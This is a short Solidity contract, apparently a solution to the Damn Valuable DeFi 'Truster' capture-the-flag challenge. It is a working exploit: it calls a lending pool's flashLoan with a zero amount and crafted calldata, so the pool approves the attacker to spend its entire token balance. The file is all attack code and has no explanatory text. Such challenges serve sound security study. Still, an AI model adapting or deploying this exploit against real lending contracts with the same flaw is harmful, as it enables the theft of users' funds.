// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";


interface ILender {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    ) external ;
}


contract AttackerSolution {

    event allowanceNow(uint256 value);

    IERC20 public immutable damnValuableToken;
    address private owner;
    address private victim;

    constructor (
        address tokenAddress,
        address _victim
    ) 
    {
        damnValuableToken = IERC20(tokenAddress);
        owner = msg.sender;
        victim = _victim;
    }

    function attackLender() external {
        require(msg.sender == owner);
        uint256 victimBalance =  damnValuableToken.balanceOf(victim);
        ILender(victim).flashLoan(
            0,
            address(1),
            address(damnValuableToken),
            abi.encodeWithSignature("approve(address,uint256)",owner,victimBalance) 
        );
        uint256 victimAllowance =  damnValuableToken.allowance(victim,owner);
        emit allowanceNow(victimAllowance);
    }

}